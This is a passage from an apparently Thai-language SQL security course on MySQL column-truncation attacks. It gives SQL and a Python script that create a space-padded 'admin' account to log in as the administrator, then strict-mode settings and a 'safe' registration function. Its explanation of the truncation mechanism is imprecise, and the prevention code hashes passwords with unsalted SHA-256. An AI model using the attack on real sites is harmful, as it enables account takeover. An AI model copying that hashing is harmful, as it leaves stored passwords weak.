# Part 074: Column Truncation Attack

## ภาพรวม

Column truncation เป็นเทคนิคที่มักถูกมองข้าม - MySQL จะตัด string ที่ยาวเกิน column size

**ขั้นตอนที่ 1181-1195**

---

## 1181. Column Truncation คืออะไร

```sql
-- MySQL ตัด string เกิน column definition
-- VARCHAR(20) = เก็บได้ 20 chars

-- หาก users table: username VARCHAR(20), password VARCHAR(255)

-- Step 1: เช็คขนาด column
SELECT CHAR_LENGTH(username), username FROM users;

-- Step 2: Attack
-- สมมติว่า admin มี username = 'admin' (5 chars)
-- สร้าง user ใหม่ username = 'admin               ' (spaces)
-- (5 + 15 spaces = 20 chars, ตัดพอดีกับ column size)

INSERT INTO users (username, password, role)
VALUES ('admin               ', 'hacked_pass', 'user');
-- MySQL ตัด spaces ออก = เหลือแค่ 'admin'

-- Step 3: Login
-- SELECT * FROM users WHERE username='admin' AND password='hacked_pass'
-- หาเจอ record ใหม่ (เพราะ username='admin' เหมือนกัน)
-- ถ้าไม่มี UNIQUE constraint
```

---

## 1182. ตัวอย่าง Attack

```python
import mysql.connector

def column_truncation_attack(host: str, db: str, user: str, password: str):
    """
    ทดสอบ column truncation attack
    """
    conn = mysql.connector.connect(
        host=host, database=db, user=user, password=password
    )
    cursor = conn.cursor()
    
    # สร้าง test table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS test_users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(20),
            password VARCHAR(255),
            role VARCHAR(10)
        )
    """)
    
    # ใส่ admin เดิม
    cursor.execute(
        "INSERT INTO test_users (username, password, role) VALUES (%s, %s, %s)",
        ('admin', 'real_admin_pass', 'admin')
    )
    
    # Attack: สร้าง 'admin               ' (20 chars)
    attack_username = 'admin' + ' ' * 15
    cursor.execute(
        "INSERT INTO test_users (username, password, role) VALUES (%s, %s, %s)",
        (attack_username, 'attacker_pass', 'user')
    )
    conn.commit()
    
    # เช็ค: MySQL truncate หรือเปล่า
    cursor.execute("SELECT id, username, CHAR_LENGTH(username), role FROM test_users")
    for row in cursor.fetchall():
        print(f"ID: {row[0]}, Username: '{row[1]}', Length: {row[2]}, Role: {row[3]}")
    
    # Login test
    cursor.execute(
        "SELECT * FROM test_users WHERE username=%s AND password=%s",
        ('admin', 'attacker_pass')
    )
    result = cursor.fetchone()
    if result:
        print(f"[!] Login succeeded as: {result[2]} ({result[3]})")
    
    cursor.execute("DROP TABLE test_users")
    conn.close()
```

---

## 1183. เงื่อนไข Strict Mode

```sql
-- MySQL STRICT_ALL_TABLES modeป้องกัน truncation:

-- เช็ค current mode:
SELECT @@sql_mode;
-- ถ้าไม่มี STRICT_ALL_TABLES = vulnerable

-- เปิด strict mode (ERROR แทน truncation):
SET GLOBAL sql_mode = 'STRICT_ALL_TABLES,STRICT_TRANS_TABLES';

-- my.cnf:
[mysqld]
sql_mode = STRICT_ALL_TABLES,STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION

-- ทดสอบ:
SET @@sql_mode = 'STRICT_ALL_TABLES';
INSERT INTO users (username, role) VALUES ('toolongusername!!!!!extra', 'admin');
-- ERROR: Data too long for column 'username' at row 1
```

---

## 1184. Prevention

```python
# Python: ตรวจสอบ และ trim ก่อน INSERT

import mysql.connector
import re

def safe_register(username: str, password: str):
    # 1. Strip whitespace
    username = username.strip()
    
    # 2. Validate: only alphanumeric + underscore
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username format")
    
    # 3. Check UNIQUE before insert
    conn = mysql.connector.connect(host='localhost', database='app', user='user', password='pass')
    cursor = conn.cursor()
    
    cursor.execute("SELECT id FROM users WHERE username = %s", (username,))
    if cursor.fetchone():
        raise ValueError("Username already exists")
    
    # 4. Parameterized INSERT
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (%s, %s)",
        (username, hash_password(password))
    )
    conn.commit()
    conn.close()

def hash_password(password: str) -> str:
    import hashlib
    return hashlib.sha256(password.encode()).hexdigest()
```

---

## สรุป

Column Truncation:
- **How it works** - MySQL trim strings เกิน column size
- **Attack** - create 'admin   ' เพื่อ bypass unique check
- **Prevention** - STRICT_ALL_TABLES, input validation, trim whitespace

---

*Part 074 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
